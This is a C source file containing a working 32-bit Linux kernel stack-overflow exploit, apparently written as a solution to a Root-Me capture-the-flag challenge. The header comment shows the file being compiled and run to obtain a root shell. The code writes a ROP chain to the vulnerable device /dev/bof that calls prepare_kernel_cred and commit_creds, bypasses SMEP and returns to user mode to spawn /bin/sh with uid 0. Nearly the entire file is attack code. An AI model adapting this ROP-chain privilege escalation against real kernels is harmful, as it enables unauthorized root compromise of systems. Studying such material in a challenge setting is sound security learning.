/*
    On a linux machine:
    vagrant@ubuntu-focal:~$ gcc -o exploit stack_overflow_smep.c -m32 -static -mtune=i686    
    
    On the target machine:
    Root-Me user@linkern-chall:~$ /mnt/share/exploit
    [+] Saved state
    [+] Building rop chain
    [+] Stack smashing incomming: rip smep
    /home/user # id
    uid=0(root) gid=0
 */

#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>

#define DEV "/dev/bof"

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_sp;
unsigned long user_eflags;

void save_state() {
  __asm(
    "pushl %cs;"
    "popl user_cs;"
    "pushfl;"
    "popl user_eflags;"
    "pushl %esp;"
    "popl user_sp;"
    "pushl %ss;"
    "popl user_ss;"
  );
}

void shell(){
    char *shell = "/bin/sh";
    char *args[] = {shell, "-i", NULL};
    execve(shell, args, NULL);
}

void exploit() {
    int fd;
    fd = open(DEV, O_RDWR);
    if (fd < 0) {
        perror("[!] failed to open device");
    }

    printf("[+] Building rop chain\n");

    unsigned long p[128];
    unsigned long offset = 10;   // 10*4 bytes to the return address
    p[offset++] = 0xc10174fc;             // pop eax ; ret
    p[offset++] = 0x0;                    // parameter
    p[offset++] = 0xc10711f0;             // prepare_kernel_cred(eax) -> eax
    p[offset++] = 0xc1070e80;             // commit_creds(eax) -> eax
    p[offset++] = 0xc101eada;             // iret
    p[offset++] = (unsigned long)shell;   // user eip
    p[offset++] = user_cs;                // saved user cs
    p[offset++] = user_eflags;            // saved user eflags
    p[offset++] = user_sp;                // saved user sp
    p[offset++] = user_ss;                // saved user ss
   
    printf("[+] Stack smashing incomming: rip smep\n");
    
    if (write(fd, p, sizeof(p)) < 0) {
        perror("[!] failed to write in device");
    }
    
}

int main(void){
    save_state();
    puts("[+] Saved state");
    
    exploit();

    return 0;
}

